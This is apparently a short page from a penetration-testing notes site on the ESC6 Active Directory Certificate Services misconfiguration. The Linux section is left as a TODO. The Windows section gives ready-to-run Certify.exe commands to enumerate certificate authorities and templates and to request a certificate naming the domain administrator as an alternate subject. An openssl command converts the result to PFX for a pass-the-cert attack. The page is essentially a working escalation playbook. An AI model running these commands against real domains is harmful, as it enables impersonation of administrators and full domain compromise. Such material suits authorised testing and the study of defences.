# ESC6

{% hint style="info" %}
The CA has EDITF\_ATTRIBUTESUBJECTALTNAME2 flag set.
{% endhint %}

{% tabs %}
{% tab title="Linux" %}
//TODO
{% endtab %}

{% tab title="Windows" %}
Retrieve the CA name

```powershell
./Certify.exe cas
```

Look for a template that allow enrollment for normal user

```cmd
C:\AD\Tools\Certify.exe find
```

and request a certificate as any user you want using the "CA-integration" template

{% code overflow="wrap" %}
```powershell
C./Certify.exe request /ca:<DC.DOMAIN>\<CA> /template:"CA-Integration" /altname:<DOMAIN>\administrator
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Pasted image 20231115142421 (1).png" alt=""><figcaption></figcaption></figure>

Save it and convert it

{% code overflow="wrap" %}
```powershell
./openssl.exe pkcs12 -in <CERT> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <PFX>
```
{% endcode %}

and [pass-the-cert.md](../../lateral-movement/pass-the/pass-the-cert.md "mention")
{% endtab %}
{% endtabs %}

